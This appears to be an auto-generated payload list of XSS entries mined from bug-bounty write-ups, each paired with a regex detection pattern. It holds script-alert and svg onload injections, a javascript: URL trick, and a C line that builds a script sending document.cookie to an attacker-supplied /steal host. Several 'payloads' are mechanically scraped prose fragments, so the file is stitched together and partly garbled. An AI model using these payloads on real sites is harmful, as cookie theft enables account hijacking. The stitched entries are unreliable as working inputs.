description: Custom payloads mined from user-provided files
author: CyberShellV2

payloads.name: XSS "adminname": "TESTAdmin<script>alert(\"F [1398b76e]
payloads.payload: "adminname": "TESTAdmin<script>alert(\"From-Admin-Name\")</script>",      # XSS-Payload , CHANGE THIS ACCORDING TO YOUR PREFERENCE
payloads.detection_pattern: "adminname":\ "TESTAdmin<script>alert\(\\"From\-Admin\-Name\\"\)</script>",\ \ \ \ \ \ \#\ XSS\-Payload\ ,\ CHANGE\ THIS\ ACCORDING\ TO\ YOUR\ PREFERENCE

payloads.name: XSS 2- When browsing here, https://█████████ [1f79a8a1]
payloads.payload: 2- When browsing here, https://█████████/portal/pls/portal/PORTAL.wwexp_render.show_tree?p_otype=SITEMAP&p_request=open&p_minusimage=&p_plusimage=&p_headerimage=%2Fimages%2Fbhfind2.gif&p_show_banner=NO&p_show_cancel=NO&p_open_item=1.FOLDER.FOLDERMAP.1_0&p_open_items=0.SITEMAP.FOLDERMAP.0_-1&p_domain=wwc&p_sub_domain=FOLDERMAP&p_title=Browse+Pages</title><svg/onload=alert(domain)>&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.ft&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.fi&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.fs&p_datasource_data=nls_sub_domain%3Dtext%2Cnls_name%3Dfolderplpopup, we can see an alert box showing the vulnerable domain caused by this HTML and JavaScript code in the title parameter.
payloads.detection_pattern: 2\-\ When\ browsing\ here,\ https://█████████/portal/pls/portal/PORTAL\.wwexp_render\.show_tree\?p_otype=SITEMAP\&p_request=open\&p_minusimage=\&p_plusimage=\&p_headerimage=%2Fimages%2Fbhfind2\.gif\&p_show_banner=NO\&p_show_cancel=NO\&p_open_item=1\.FOLDER\.FOLDERMAP\.1_0\&p_open_items=0\.SITEMAP\.FOLDERMAP\.0_\-1\&p_domain=wwc\&p_sub_domain=FOLDERMAP\&p_title=Browse\+Pages</title><svg/onload=alert\(domain\)>\&p_datasource_data=document\.SEARCH60_PAGESEARCH_362193163\.ft\&p_datasource_data=document\.SEARCH60_PAGESEARCH_362193163\.fi\&p_datasource_data=document\.SEARCH60_PAGESEARCH_362193163\.fs\&p_datasource_data=nls_sub_domain%3Dtext%2Cnls_name%3Dfolderplpopup,\ we\ can\ see\ an\ alert\ box\ showing\ the\ vulnerable\ domain\ caused\ by\ this\ HTML\ and\ JavaScript\ code\ in\ the\ title\ parameter\.

payloads.name: XSS > Initially, I tried to verify the XSS a [28090c1c]
payloads.payload: > Initially, I tried to verify the XSS attack, I used standard XSS payload <script>alert("Verification");</script> and the Below Image confirmed that, the parameter is vulnerable to reflected XSS.
payloads.detection_pattern: >\ Initially,\ I\ tried\ to\ verify\ the\ XSS\ attack,\ I\ used\ standard\ XSS\ payload\ <script>alert\("Verification"\);</script>\ and\ the\ Below\ Image\ confirmed\ that,\ the\ parameter\ is\ vulnerable\ to\ reflected\ XSS\.

payloads.name: XSS Click the Log option and capture the pac [44460e4a]
payloads.payload: Click the Log option and capture the packet, you will get a request similar to the following: /get_logs_with_metadata?dag_id=example_xcom&task_id=push_by_returning&map_index=-1&execution_date=2022-08-29T13%3A25%3A11%2B00%3A00&try_number=1&metadata=null
payloads.detection_pattern: Click\ the\ Log\ option\ and\ capture\ the\ packet,\ you\ will\ get\ a\ request\ similar\ to\ the\ following:\ /get_logs_with_metadata\?dag_id=example_xcom\&task_id=push_by_returning\&map_index=\-1\&execution_date=2022\-08\-29T13%3A25%3A11%2B00%3A00\&try_number=1\&metadata=null

payloads.name: XSS Modify try_number to a nonexistent value [1088fc6a]
payloads.payload: Modify try_number to a nonexistent value, such as 9999, such as: /get_logs_with_metadata?dag_id=example_xcom&task_id=push_by_returning&map_index=-1&execution_date=2022-08-29T13%3A25%3A11%2B00%3A00&try_number=9999&metadata=null
payloads.detection_pattern: Modify\ try_number\ to\ a\ nonexistent\ value,\ such\ as\ 9999,\ such\ as:\ /get_logs_with_metadata\?dag_id=example_xcom\&task_id=push_by_returning\&map_index=\-1\&execution_date=2022\-08\-29T13%3A25%3A11%2B00%3A00\&try_number=9999\&metadata=null

payloads.name: XSS The :web_url does not check for correctn [3e2705be]
payloads.payload: The :web_url does not check for correctness of the URL and can thus be given a JavaScript URL such as javascript:alert(document.domain). The :id is sanitized by ruby sanitizer, but is not HTML encoded. This will open up a "safe" HTML injection, which we can use to make the attack easier to pull of.
payloads.detection_pattern: The\ :web_url\ does\ not\ check\ for\ correctness\ of\ the\ URL\ and\ can\ thus\ be\ given\ a\ JavaScript\ URL\ such\ as\ javascript:alert\(document\.domain\)\.\ The\ :id\ is\ sanitized\ by\ ruby\ sanitizer,\ but\ is\ not\ HTML\ encoded\.\ This\ will\ open\ up\ a\ "safe"\ HTML\ injection,\ which\ we\ can\ use\ to\ make\ the\ attack\ easier\ to\ pull\ of\.

payloads.name: XSS int lenS = snprintf(server, BUFFER_SIZE, [a4859b58]
payloads.payload: int lenS = snprintf(server, BUFFER_SIZE, "<script>new Image().src='http://%s:%d/steal?c='+encodeURIComponent(document.cookie);</script>", ipServer, portY);
payloads.detection_pattern: int\ lenS\ =\ snprintf\(server,\ BUFFER_SIZE,\ "<script>new\ Image\(\)\.src='http://%s:%d/steal\?c='\+encodeURIComponent\(document\.cookie\);</script>",\ ipServer,\ portY\);

payloads.name: XSS response = requests.request("POST", Webs [e52612a0]
payloads.payload: response = requests.request("POST", Website_url, headers=headers, data = Admin_login_credentials)
payloads.detection_pattern: response\ =\ requests\.request\("POST",\ Website_url,\ headers=headers,\ data\ =\ Admin_login_credentials\)
